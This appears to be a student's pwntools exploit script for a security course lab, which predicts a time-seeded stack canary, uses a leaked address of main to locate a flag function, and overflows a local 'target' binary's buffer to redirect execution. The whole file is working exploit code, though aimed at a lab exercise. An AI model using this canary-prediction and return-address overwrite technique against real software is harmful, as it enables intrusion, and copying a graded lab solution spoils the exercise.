import ctypes
from pwn import *
import re

libc = ctypes.CDLL(None)
v0 = libc.time(0)
libc.srand(v0)
v1 = libc.rand()
canary = v1

# p = process('/home/csed415-lab02/target')
p = process('./target')
p.recvline()
line = p.recvline()
address_main = re.search('0x[0-9a-f]+', str(line))
address_main = int(address_main.group(), 16)

address_flag = address_main - (0x0000000000001457 - 0x00000000000012ea)

exploit = b'a' * 24
exploit += p64(canary)
exploit += b'a' * 8
exploit += p64(address_flag)

print(len(exploit))

p.sendline(exploit)

print('canary: ' + hex(canary))
print(hex(address_flag))

p.interactive()